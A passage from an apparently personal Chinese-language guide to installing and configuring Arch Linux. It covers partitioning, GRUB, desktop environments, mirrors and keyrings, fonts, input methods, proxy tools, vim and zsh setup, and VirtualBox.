<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">parted /dev/sda mklabel gpt<br>parted /dev/sda mkpart  ESP fat32 1M 513M<br>parted /dev/sda <span class="hljs-built_in">set</span> 1 boot on<br>parted /dev/sda mkpart primary ext4 513M 20.5G  <span class="hljs-comment"># 20.5G 为绝对大小</span><br>parted /dev/sda mkpart primary ext4 20.5G 100%<br><br>mkdir /mnt/boot<br>mkfs.fat -F32 /dev/sda1<br>mkfs.ext4 /dev/sda2<br>mount /dev/sda1 /mnt/boot<br>mount /dev/sda2 /mnt<br><br>pacstrap /mnt base base-devel<br>genfstab -L /mnt &gt;&gt; /mnt/etc/fstab<br>......<br><br>pacman -S grub efibootmgr<br>grub-install --target=x86_64-efi --efi-directory=esp --bootloader-id=GRUB <br>grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></div></td></tr></table></figure>
<h2 id="可选桌面环境安装"><a class="markdownIt-Anchor" href="#可选桌面环境安装"></a> 可选桌面环境安装</h2>
<p>接着还需要按照桌面环境</p>
<h3 id="gnome"><a class="markdownIt-Anchor" href="#gnome"></a> GNOME</h3>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo pacman -S gnome gnome-extra<br>gnome-session<br></code></pre></div></td></tr></table></figure>
<h3 id="kde"><a class="markdownIt-Anchor" href="#kde"></a> KDE</h3>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo pacman -S plasma   kde-applications<br>startkde<br></code></pre></div></td></tr></table></figure>
<h3 id="deepin"><a class="markdownIt-Anchor" href="#deepin"></a> Deepin</h3>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo pacman -S deepin deepin-extra<br>1. lightdm<br>nano /etc/lightdm/lightdm.conf<br>	[Seat:*]<br>    ...<br>    greeter-session=lightdm-deepin-greeter<br>   <br>2. Xinit<br>nano ~/.xinitrc<br>	exec startdde<br>startx<br></code></pre></div></td></tr></table></figure>
<h3 id="xfce"><a class="markdownIt-Anchor" href="#xfce"></a> Xfce</h3>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo pacman -S xfce4 xfce4-goodies<br>startxfce4（手动进入桌面）<br></code></pre></div></td></tr></table></figure>
<h2 id="安装桌面登录管理器自行选择"><a class="markdownIt-Anchor" href="#安装桌面登录管理器自行选择"></a> 安装桌面登录管理器(自行选择)</h2>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo pacman -S sddm<br>sudo systemctl enable sddm<br><br>sudo pacman -S gdm<br>sudo systemctl enable gdm<br><br>sudo pacman -S lightdm lightdm-gtk-greeter<br>sudo systemctl enable lightdm<br></code></pre></div></td></tr></table></figure>
<h2 id="配置网络"><a class="markdownIt-Anchor" href="#配置网络"></a> 配置网络</h2>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo pacman -S network-manager-applet<br>sudo systemctl disable netctl<br>sudo systemctl enable NetworkManager<br></code></pre></div></td></tr></table></figure>
<h2 id="启动蓝牙"><a class="markdownIt-Anchor" href="#启动蓝牙"></a> 启动蓝牙</h2>
<p>安装了KDE话，默认是未找到蓝牙适配器的。若要连接到蓝牙耳麦，那么可以这样做</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo pacman -S bluez bluez-utils pulseaudio-bluetooth pavucontrol pulseaudio-alsa<br>sudo systemctl <span class="hljs-built_in">enable</span> bluetooth<br>usermod -aG lp <span class="hljs-variable">$USER</span><br><br>sudo systemctl start bluetooth<br>pulseaudio -k<br>pulseaudio --start<br></code></pre></div></td></tr></table></figure>
<h2 id="软件仓库镜像"><a class="markdownIt-Anchor" href="#软件仓库镜像"></a> 软件仓库镜像</h2>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nano /etc/pacman.d/mirrorlist<br>	Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/<span class="hljs-variable">$repo</span>/os/<span class="hljs-variable">$arch</span><br>    Server = http://mirrors.ustc.edu.cn/archlinux/<span class="hljs-variable">$repo</span>/os/<span class="hljs-variable">$arch</span><br>    Server = http://mirrors.aliyun.com/archlinux/<span class="hljs-variable">$repo</span>/os/<span class="hljs-variable">$arch</span><br>    Server = http://mirrors.163.com/archlinux/<span class="hljs-variable">$repo</span>/os/<span class="hljs-variable">$arch</span><br>    Server = http://mirrors.hust.edu.cn/archlinux/<span class="hljs-variable">$repo</span>/os/<span class="hljs-variable">$arch</span><br>    Server = http://run.hit.edu.cn/archlinux/<span class="hljs-variable">$repo</span>/os/<span class="hljs-variable">$arch</span><br>    Server = http://ftp.kaist.ac.kr/ArchLinux/<span class="hljs-variable">$repo</span>/os/<span class="hljs-variable">$arch</span><br>    Server = http://mirrors.hustunique.com/archlinux/<span class="hljs-variable">$repo</span>/os/<span class="hljs-variable">$arch</span><br>    Server = http://ftp.jaist.ac.jp/pub/Linux/ArchLinux/<span class="hljs-variable">$repo</span>/os/<span class="hljs-variable">$arch</span><br>    Server = http://mirror.premi.st/archlinux/<span class="hljs-variable">$repo</span>/os/<span class="hljs-variable">$arch</span><br>    Server = http://mirror.its.dal.ca/archlinux/<span class="hljs-variable">$repo</span>/os/<span class="hljs-variable">$arch</span><br>    Server = http://mirror.de.leaseweb.net/archlinux/<span class="hljs-variable">$repo</span>/os/<span class="hljs-variable">$arch</span><br>    Server = http://mirror.clibre.uqam.ca/archlinux/<span class="hljs-variable">$repo</span>/os/<span class="hljs-variable">$arch</span><br>    <br>nano /etc/pacman.conf<br>	[multilib]<br>	Include = /etc/pacman.d/mirrorlist<br>	<br>	[archlinuxcn]<br>    Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="hljs-variable">$arch</span><br>    <br>   	或者：<br>   	<br>   	[archlinuxcn]<br>    Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="hljs-variable">$arch</span><br><br>安装 archlinuxcn-keyring 导入 GPG key<br>sudo pacman -S archlinuxcn-keyring 直接这样会出错<br>sudo pacman -Syu haveged<br>sudo systemctl start haveged<br>sudo systemctl <span class="hljs-built_in">enable</span> haveged<br><br>sudo rm -fr /etc/pacman.d/gnupg<br>sudo pacman-key --init<br>sudo pacman-key --populate archlinux<br>sudo pacman-key --populate archlinuxcn<br>sudo pacman -S archlinuxcn-keyring<br>sudo pacman -Syu<br></code></pre></div></td></tr></table></figure>
<p>解决：</p>
<blockquote>
<p><em>错误：无法提交处理 (无效或已损坏的软件包 (PGP 签名))</em></p>
</blockquote>
<p>此处参考：</p>
<ul>
<li><a href="https://www.archlinuxcn.org/gnupg-2-1-and-the-pacman-keyring/">GnuPG-2.1 与 pacman 密钥环</a></li>
<li><a href="https://www.archlinuxcn.org/archlinux-cn-repo-and-mirror/">Arch Linux 中文社区仓库 / 镜像加速源</a></li>
</ul>
<h2 id="安装字体中文"><a class="markdownIt-Anchor" href="#安装字体中文"></a> 安装字体(中文)</h2>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">1. sudo pacman -S adobe-source-han-sans-cn-fonts (思源黑体)<br>2. sudo pacman -S ttf-dejavu<br>3. sudo pacman -S wqy-zenhei<br>4. sudo pacman -S wqy-microhei<br><br>nano /etc/locale.conf<br>    LANG=zh_CN.UTF-8<br>reboot<br></code></pre></div></td></tr></table></figure>
<p>推荐安装 FireCode 自体 <a href="https://github.com/tonsky/FiraCode">https://github.com/tonsky/FiraCode</a></p>
<h2 id="中文输入法"><a class="markdownIt-Anchor" href="#中文输入法"></a> 中文输入法</h2>
<p>建议卸载fcitx4，改用fcitx5</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">pacman -S fcitx5-git  fcitx5-qt5-git fcitx5-gtk-git fcitx5-chinese-addons-git fcitx5-configtool-git fcitx5-rime-git<br></code></pre></div></td></tr></table></figure>
<p>环境变量</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">vim ~/.xprofile<br><span class="hljs-built_in">export</span> GTK_IM_MODULE=fcitx5<br><span class="hljs-built_in">export</span> QT_IM_MODULE=fcitx5<br><span class="hljs-built_in">export</span> XMODIFIERS=<span class="hljs-string">&quot;@im=fcitx&quot;</span><br>fcitx5 &amp;<br></code></pre></div></td></tr></table></figure>
<h2 id="安装icon主题可选"><a class="markdownIt-Anchor" href="#安装icon主题可选"></a> 安装Icon主题(可选)</h2>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">pacman -S numix-circle-icon-theme-git<br></code></pre></div></td></tr></table></figure>
<h2 id="pacman彩色输出"><a class="markdownIt-Anchor" href="#pacman彩色输出"></a> pacman彩色输出</h2>
<p>编辑 <code>/etc/pacman.conf</code>，取消 <code>Color</code> 注释</p>
<h2 id="nano-支持代码高亮"><a class="markdownIt-Anchor" href="#nano-支持代码高亮"></a> Nano 支持代码高亮</h2>
<p>nano是linux下轻量级的文本编辑器，也是大多数linux发行版都默认安装的。但默认安装archlinux后 nano对于特殊文本的代码高亮支持并没有开启，因此要想让代码高亮显示，就要手动开启该功能。</p>
<p>首先nano所支持的一些代码格式文件存放在  <strong>/usr/share/nano/</strong> 目录下</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ ls /usr/share/nano/<br>asm.nanorc        elisp.nanorc       json.nanorc      objc.nanorc        ruby.nanorc<br>autoconf.nanorc   fortran.nanorc     lua.nanorc       ocaml.nanorc       rust.nanorc<br>awk.nanorc        gentoo.nanorc      makefile.nanorc  patch.nanorc       sh.nanorc<br>changelog.nanorc  go.nanorc          man.nanorc       perl.nanorc        spec.nanorc<br>cmake.nanorc      groff.nanorc       mgp.nanorc       php.nanorc         tcl.nanorc<br>c.nanorc          guile.nanorc       mutt.nanorc      po.nanorc          texinfo.nanorc<br>css.nanorc        html.nanorc        nanohelp.nanorc  postgresql.nanorc  tex.nanorc<br>debian.nanorc     java.nanorc        nanorc.nanorc    pov.nanorc         xml.nanorc<br>default.nanorc    javascript.nanorc  nftables.nanorc  python.nanorc<br><br></code></pre></div></td></tr></table></figure>
<p>此时，我们可以在当前用户主目录下新建 <strong>.nanorc</strong> 文件，并添加 <code>/usr/share/nano/*.nanorc</code>  表示nano支持 /usr/share/nano 下的所有代码格式。</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ cat ~/.nanorc <br>	include /usr/share/nano/*.nanorc<br></code></pre></div></td></tr></table></figure>
<h2 id="修改yay-aur国内源"><a class="markdownIt-Anchor" href="#修改yay-aur国内源"></a> 修改yay aur国内源</h2>
<p>建议用 <strong>yay</strong> 而不是 <strong>yaourt</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo pacman -S yay<br>nano ~/.config/yay/config.json<br>	        <span class="hljs-string">&quot;aururl&quot;</span>: <span class="hljs-string">&quot;https://aur.archlinux.org&quot;</span><br>			替换为 <br>			<span class="hljs-string">&quot;aururl&quot;</span>: <span class="hljs-string">&quot;https://aur.tuna.tsinghua.edu.cn&quot;</span><br></code></pre></div></td></tr></table></figure>
<p>或者直接：</p>
<p><code>yay --aururl &quot;https://aur.tuna.tsinghua.edu.cn&quot; --save</code></p>
<h2 id="代理"><a class="markdownIt-Anchor" href="#代理"></a> 代理</h2>
<h3 id="proxychains"><a class="markdownIt-Anchor" href="#proxychains"></a> ProxyChains</h3>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo pacman -S proxychains-ng<br>nano /etc/proxychains.conf<br>	添加 <span class="hljs-string">&quot; socks5  127.0.0.1 1080 &quot;</span><br></code></pre></div></td></tr></table></figure>
<p>比如 <code>proxychains curl https://ip.cn</code></p>
<h3 id="shadowsocks"><a class="markdownIt-Anchor" href="#shadowsocks"></a> Shadowsocks</h3>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">pacman -S shadowsocks-qt5<br>google-chrome-stable --proxy-server=&quot;socks5://127.0.0.1:1080&quot; (暂时代理)<br></code></pre></div></td></tr></table></figure>
<h3 id="lantern"><a class="markdownIt-Anchor" href="#lantern"></a> Lantern</h3>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">pacman -S lantern-bin<br></code></pre></div></td></tr></table></figure>
<h3 id="v2ray"><a class="markdownIt-Anchor" href="#v2ray"></a> v2ray</h3>
<p>v2ray的安装方法官网有详细信息，<code>qv2ray</code>是Qt开发的基于v2ray core的GUI程序，支持Windows、Linux、macOS。</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">pacman -S v2ray qv2ray<br></code></pre></div></td></tr></table></figure>
<p>之后就可以添加一些订阅地址或者自己买VPS搭建服务器</p>
<h3 id="xx-net-proxy-switchyomega-chrome"><a class="markdownIt-Anchor" href="#xx-net-proxy-switchyomega-chrome"></a> XX-Net + Proxy SwitchyOmega + Chrome</h3>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">pacman -S xx-net<br>或者到 Github clone<br>	git clone https://github.com/XX-net/XX-Net.git<br>	...<br></code></pre></div></td></tr></table></figure>
<h2 id="音乐网易云"><a class="markdownIt-Anchor" href="#音乐网易云"></a> 音乐(网易云)</h2>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">yaourt -S netease-cloud-music<br></code></pre></div></td></tr></table></figure>
<h2 id="office"><a class="markdownIt-Anchor" href="#office"></a> Office</h2>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">wps-office,ttf-wps-fonts<br>libreoffice<br>永中Office https://www.yozosoft.com/home.htm<br></code></pre></div></td></tr></table></figure>
<h2 id="解压缩文件"><a class="markdownIt-Anchor" href="#解压缩文件"></a> 解压缩文件</h2>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo pacman -S file-roller  xarchiver unzip unrar<br></code></pre></div></td></tr></table></figure>
<h2 id="数据库客户端管理"><a class="markdownIt-Anchor" href="#数据库客户端管理"></a> 数据库客户端管理</h2>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sqlitebrowser,dbeaver...<br></code></pre></div></td></tr></table></figure>
<h2 id="重命名网卡为eth0"><a class="markdownIt-Anchor" href="#重命名网卡为eth0"></a> 重命名网卡为eth0…</h2>
<p>之前: ifconfig</p>
<blockquote>
<p>enp12s0<br />
lo<br />
wlp3s0b1</p>
</blockquote>
<p>关键是 <code>net.ifnames=0</code></p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">1. ArchLinux<br><span class="hljs-meta">-&gt;</span><span class="bash"> /etc/default/grub</span><br>    GRUB_CMDLINE_LINUX=&quot;&quot;<br>    GRUB_CMDLINE_LINUX_DEFAULT=&quot;audit=0 loglevel=3 quiet net.ifnames=0&quot;<br>grub-mkconfig -o /boot/grub/grub.cfg<br><br>2. CentOS<br><span class="hljs-meta">-&gt;</span><span class="bash"> net.ifnames=0 biosdevname=0</span><br><span class="hljs-meta">-&gt;</span><span class="bash"> /etc/sysconfig/grub &lt;=&gt; /etc/default/grub</span><br>    GRUB_CMDLINE_LINUX=... net.ifnames=0 biosdevname=0  ...<br>grub2-mkconfig -o /boot/grub2/grub.cfg<br></code></pre></div></td></tr></table></figure>
<h2 id="vim配置模板"><a class="markdownIt-Anchor" href="#vim配置模板"></a> Vim配置(模板)</h2>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">set nocp<br>set modelines=0<br>set backspace=2<br>syntax on <br>autocmd InsertLeave * se nocul<br>autocmd InsertEnter * se cul<br>set smartindent <br>set autoindent<br>set confirm <br>set tabstop=4 <br>set softtabstop=4<br>set shiftwidth=4 <br>set expandtab <br>set number<br>set history=50  <br>set hlsearch<br>set incsearch<br>set gdefault<br>set encoding=utf-8<br>set fileencodings=utf-8,ucs-bom,shift-jis,gb18030,gbk,gb2312,cp936,utf-16,big5,euc-jp,latin1<br>set guifont=Menlo:h16:cANSI <br>set langmenu=zn_CN.UTF-8<br>set helplang=cn <br>set ruler <br>set laststatus=1 <br>set showcmd <br>set scrolloff=3<br>set showmatch <br>set matchtime=5<br>set autowrite <br>set wildmenu  <br>set linespace=2 <br>set whichwrap=b,s,&lt;,&gt;,[,] <br>filetype plugin indent on <br>set foldenable  <br>set cursorline <br>set magic  <br>set ignorecase<br>filetype on <br>set background=dark<br>set t_Co=256   <br>set mouse=i <br>set backspace=indent,eol,start<br></code></pre></div></td></tr></table></figure>
<h2 id="zsh"><a class="markdownIt-Anchor" href="#zsh"></a> Zsh</h2>
<p><a href="https://wiki.archlinux.org/index.php/Zsh_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Zsh_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a><br />
<a href="https://github.com/robbyrussell/oh-my-zsh/">https://github.com/robbyrussell/oh-my-zsh/</a></p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo pacman -S zsh<br>1. sudo pacman -S oh-my-zsh-git<br>2. sh -c &quot;$(wget -O- https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;<br>3. sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;<br>4. curl -Lo install.sh https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh<br>sh install.sh<br><br>sudo chsh -s /bin/zsh <br>nano .zshrc<br>    ZSH_THEME=&quot;jtriley&quot;<br>    plugin: zsh-syntax-highlighting<br>git clone https://github.com/zsh-users/zsh-syntax-highlighting  ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting<br></code></pre></div></td></tr></table></figure>
<h2 id="虚拟机virtualbox"><a class="markdownIt-Anchor" href="#虚拟机virtualbox"></a> <a href="https://wiki.archlinux.org/index.php/VirtualBox_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">虚拟机Virtualbox</a></h2>
<figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S virtualbox virtualbox-host-modules-arch</span><br><span class="hljs-attribute">pacman -S linux-headers linux</span><br></code></pre></div></td></tr></table></figure>
<h3 id="加载-virtualbox-内核模块"><a class="markdownIt-Anchor" href="#加载-virtualbox-内核模块"></a> 加载 VirtualBox 内核模块</h3>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">手动加载模块<br><span class="hljs-meta">#</span><span class="bash"> modprobe -a vboxguest vboxsf vboxvideo</span><br><span class="hljs-meta">#</span><span class="bash"> -&gt; modprobe vboxdrv</span><br><span class="hljs-meta">#</span><span class="bash"> lsmod|grep vb</span> <br>    vboxnetflt             32768  0<br>    vboxnetadp             28672  0<br>    vboxpci                28672  0<br>    vboxdrv               503808  3 vboxpci,vboxnetadp,vboxnetflt<br><br>开机自动加载模块,启用 vboxservice.service 服务<br></code></pre></div></td></tr></table></figure>
<h3 id="增强功能"><a class="markdownIt-Anchor" href="#增强功能"></a> 增强功能</h3>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">1. USB使用:<br>sudo usermod -aG vboxusers whos 或 sudo gpasswd -a whos vboxusers<br><br>2. 增强功能(载入ISO功能包)<br>sudo pacman -S  virtualbox-guest-iso<br><span class="hljs-meta">--&gt;</span><span class="bash"> /usr/lib/virtualbox/additions/VBoxGuestAdditions.iso</span><br></code></pre></div></td></tr></table></figure>
<p>或者自己去下载 <strong>VBoxGuestAdditions.iso</strong> ，并在使用virtualbox时载入iso</p>
<p><a href="https://download.virtualbox.org/virtualbox/6.0.10/">https://download.virtualbox.org/virtualbox/6.0.10/</a></p>
<h3 id="下载拓展包"><a class="markdownIt-Anchor" href="#下载拓展包"></a> 下载拓展包</h3>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">wget https://download.virtualbox.org/virtualbox/6.0.10/Oracle_VM_VirtualBox_Extension_Pack-6.0.10.vbox-extpack<br></code></pre></div></td></tr></table></figure>
<h3 id="手动挂载"><a class="markdownIt-Anchor" href="#手动挂载"></a> 手动挂载</h3>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">在virtualbox虚拟机运行：<br>mount -t vboxsf &lt;共享目录的名字&gt; &lt;客户机系统的挂载点&gt;<br><br>查看 vboxsf 的挂载参数<br>mount.vboxsf<br><br>假如用户不在 vboxsf 组里，用这个命令可以把挂载点的读写权限授权给他：<br><span class="hljs-meta">#</span><span class="bash"> mount -t vboxsf -o uid=1000,gid=1000 home /mnt/</span><br><span class="hljs-meta">#</span><span class="bash"> usermod -aG vboxsf guest</span> <br></code></pre></div></td></tr></table></figure>
<h2 id="百度云盘"><a class="markdownIt-Anchor" href="#百度云盘"></a> 百度云盘</h2>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo pacman -S baidunetdisk-bin<br></code></pre></div></td></tr></table></figure>
<h2 id="mariadb数据库"><a class="markdownIt-Anchor" href="#mariadb数据库"></a> MariaDB数据库</h2>
